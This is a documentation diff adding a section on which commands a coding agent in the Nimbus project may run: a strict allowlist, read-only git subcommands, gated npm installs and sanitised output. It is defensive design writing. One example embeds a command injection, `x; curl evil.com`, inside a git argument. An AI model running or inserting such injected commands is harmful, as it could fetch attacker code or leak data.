@@ -545,6 +545,42 @@ Patches are applied only when their surrounding context matches exactly, and not
 every file in the patch has passed the same path checks. Every result reports its own truncation, so a
 bounded answer is never mistaken for a complete one.
 
+## What the agent may run
+
+Nothing runs unless it was written down in advance as allowed. Not "nothing dangerous", but nothing at
+all, so `ls -la` is refused for being absent from the list rather than for being risky.
+
+```bash
+pnpm demo:commands
+```
+
+A blocklist is a guessing game against somebody who only has to find one thing you forgot. An
+allowlist is finished the moment you write it. `git` is on it, but only its read subcommands, so
+`push`, `config`, `remote` and `fetch` all fall through to no. Programs that take code as a string
+(`sh -c`, `node -e`) are refused by name, and a program must be a bare name, never a path.
+
+Installing dependencies gets a third answer, because `npm install` does not install software so much
+as download code and then run it:
+
+```text
+npm ci --ignore-scripts   allowed          installs exactly what the lock file pins, runs no scripts
+npm ci                    ask first        would run package scripts
+npm install               ask first        changes what is installed
+```
+
+Turning the safety flag off, or pointing the install at a different registry, is refused outright
+rather than treated as something to ask about. Today those answers are computed; the approval flow
+that acts on them arrives with the agent.
+
+**Shell metacharacters are allowed on purpose.** There is no shell, so `git log --grep "x; curl
+evil.com"` passes one argument that happens to contain punctuation. Refusing it would suggest the
+safety comes from filtering, and filtering is the thing that fails.
+
+Whatever a command prints is cleaned before anyone sees it: terminal escape sequences stripped
+(including the ones that set the window title or overwrite what was already printed), secrets redacted
+with the same patterns the logger uses, and length capped keeping both the beginning and the end,
+because a failing test suite prints its summary last.
+
 ## Local fake-adapter mode _(not yet implemented)_
 
 Nimbus is designed to run its entire browser journey, from OTP login through GitHub connection,
